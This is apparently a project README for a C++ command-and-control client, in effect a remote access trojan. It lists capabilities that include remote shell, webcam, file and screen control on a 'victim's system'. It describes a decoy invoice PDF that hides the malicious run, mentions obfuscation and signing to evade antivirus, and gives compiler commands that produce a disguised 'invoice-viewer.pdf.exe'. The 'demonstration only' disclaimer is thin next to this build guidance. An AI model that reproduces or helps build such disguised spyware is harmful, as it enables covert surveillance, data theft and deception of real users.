# C2-CLIENT-DEMO

FOR DEMONSTRATION PURPUSES ONLY. This shows the in-depth on how command to server outbound connection works. the mainpurpose is for security pesonnel to know the patterns in which a c2 Virus might work in the background and steal infomations from users in the backgound pesistently.

**MORE INFO** <br>
In these pogram, i used a pulling method hence it affects cpu usage. this is done deliberately so that no one build up this project and use it seemlessly.
But in a real world usage, streamlining or socketted connection will be used.

This program can gets inf from the victims system, also operate the system remotely from any where, accessing all features in the victim's system.

This programm is built using c++, which caqn interact with the any BIOS of the machine

My goal is to understand oe of the still useful way a red hacker steal info so as security measures to protect against it will be discovered.

A wel tailored malware, when compiled will be strip off and obsulatedand signed in, so antivirus alone, windows defender, wont be able to detect it.

As shown in this program, when the victim clicks on it, a pdf document alone is shown, deceiving the client that it is just an invoice pdf instead of a malicious attack.

This project is a C++ application designed for remote control and management of a computer. It provides various features such as screen sharing, file management, process management, system information display, chat functionality, remote shell access, power control, clipboard synchronization, camera access, multi-session management, file transfer capabilities, screenshot functionality, session recording, help and FAQ support, and security features.

## Features

1. **Real-time Interactive Screen Sharing / Remote Control**
   - Live screen stream with continuous screenshot/video frame updates.
   - Mouse and keyboard control for remote interaction.

2. **File Manager**
   - Browse, upload, download, delete, rename, and move files/folders with a GUI.

3. **Process Manager**
   - View and manage running processes, including CPU and memory usage.

4. **System Info and Monitoring**
   - Display hardware and network information, including resource usage charts.

5. **Chat or Messaging**
   - Simple text chat functionality for communication during sessions.

6. **Remote Shell Terminal**
   - Interactive shell terminal for executing commands and viewing outputs.

7. **Power Control**
   - Options to restart, shut down, sleep, or log off the remote machine.

8. **Clipboard Sync**
   - Synchronize clipboard text between local and remote machines.

9. **Remote Camera Access**
   - Access and display the remote device's webcam.

10. **Multi-session Management**
    - Manage multiple clients with tabs or a list for easy switching.

11. **File Transfer Resume & Progress Bar**
    - Show progress of uploads/downloads and support resuming broken transfers.

12. **Screenshot Annotation and Saving**
    - Save and annotate screenshots locally from sessions.

13. **Session Recording**
    - Record remote sessions as video or screenshots for later playback.

14. **Help / FAQ Panel**
    - Provide simple help guides and instructions for users.

15. **Secure Access**
    - Implement user authentication, encryption, session timeout, and logging.

**USAGE** <br>
BUILDING FROM MACOS

x86_64-w64-mingw32-g++ _.cpp _.h resource.o sqlite3.o \\n -o ../build/invoice-viewer.exe \\n -std=gnu++17 \\n -I. \\n -static -static-libgcc -static-libstdc++ -pthread \\n -lws2_32 \\n -liphlpapi \\n -lgdiplus -lgdi32 -lole32 -loleaut32 -luuid -lstrmiids \\n -lwtsapi32 -lnetapi32 \\n -lMfplat -lMf -lMfreadwrite -lMfuuid -lPowrProf \\n -lcrypt32 -lbcrypt -lshlwapi -mwindows

cd ../build
click .exe

BUILDING FROM WINDOWS
g++ _.cpp _.h resource.o sqlite3.o \\n -o ../build/invoice-viewer.pdf.exe \\n -std=gnu++17 \\n -I. \\n -static -static-libgcc -static-libstdc++ -pthread \\n -lws2_32 \\n -liphlpapi \\n -lgdiplus -lgdi32 -lole32 -loleaut32 -luuid -lstrmiids \\n -lwtsapi32 -lnetapi32 \\n -lMfplat -lMf -lMfreadwrite -lMfuuid -lPowrProf \\n -lcrypt32 -lbcrypt -lshlwapi -mwindows

cd ../build
click .exe

You can use make to run everything seamlessly, by following this

# C++ Remote Client

## Build Instructions

To build the project, you need to have CMake installed. Follow these steps:

1. Clone the repository:

   ```
   git clone <repository-url>
   cd cpp-remote-client
   ```

2. Create a build directory:

   ```
   mkdir build
   cd build
   ```

3. Run CMake to configure the project:

   ```
   cmake ..
   ```

4. Build the project:
   ```
   make
   ```

## Usage

After building the project, you can run the application. Ensure that the server is set up to accept connections from the client. Follow the on-screen instructions to utilize the various features of the application.

## License

This project is licensed under the MIT License. See the LICENSE file for more details.
